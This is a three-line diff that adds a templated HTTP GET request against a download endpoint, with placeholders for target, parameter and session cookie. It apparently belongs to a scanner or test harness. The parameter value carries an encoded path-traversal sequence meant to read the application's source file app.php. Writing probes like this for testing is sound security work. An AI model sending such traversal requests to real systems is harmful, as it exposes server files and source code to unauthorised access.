@@ -1,0 +1,3 @@
+GET {{TARGET}}/download?{{DL_PARAM}}=..%2Fsrc%2Fapp.php HTTP/1.1
+Cookie: {{SESSION}}
+
